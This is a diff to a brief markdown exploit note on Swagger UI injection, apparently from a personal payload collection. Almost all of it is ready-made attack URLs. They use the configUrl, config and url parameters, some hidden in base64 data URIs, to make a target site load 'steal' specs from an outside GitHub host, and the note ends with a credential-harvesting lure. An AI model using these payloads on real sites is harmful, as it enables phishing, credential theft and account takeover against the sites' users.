@@ -1,15 +1,24 @@
 ### Issue: Credentials Stealing: Injection Vulnerability on a Swagger Endpoint
 
+Blog https://blog.vidocsecurity.com/blog/hacking-swagger-ui-from-xss-to-account-takeovers
+
 Site:
 ```bash
 site.com/swagger-ui.html
 site.com/swagger
+AnyEndpoint Doesn't matter
+
 ```
 Exploit:
 ```bash
 site.com/swagger-ui.html?configUrl=https://raw.githubusercontent.com/sahil3276/swagger/refs/heads/main/steal.json
 site.com/swagger?config=https://raw.githubusercontent.com/sahil3276/swagger/refs/heads/main/steal.json
 site.com/swagger?url=https://raw.githubusercontent.com/sahil3276/swagger/refs/heads/main/steal.yaml
+?configUrl=data:text/html;base64,ewogICJ1cmwiOiAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NhaGlsMzI3Ni9zd2FnZ2VyL3JlZnMvaGVhZHMvbWFpbi9zdGVhbC55YW1sIgp9
+?url=data:text/html;base64,ewogICJ1cmwiOiAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NhaGlsMzI3Ni9zd2FnZ2VyL3JlZnMvaGVhZHMvbWFpbi9zdGVhbC55YW1sIgp9
+?configUrl=data:text/html;base64,ewogICJ1cmwiOiAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NhaGlsMzI3Ni9zd2FnZ2VyL3JlZnMvaGVhZHMvbWFpbi9zdGVhbC5qc29uIgp9
+?url=data:text/html;base64,ewogICJ1cmwiOiAiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3NhaGlsMzI3Ni9zd2FnZ2VyL3JlZnMvaGVhZHMvbWFpbi9zdGVhbC5qc29uIgp9
+
 ```
 
 PUT your credentials there.
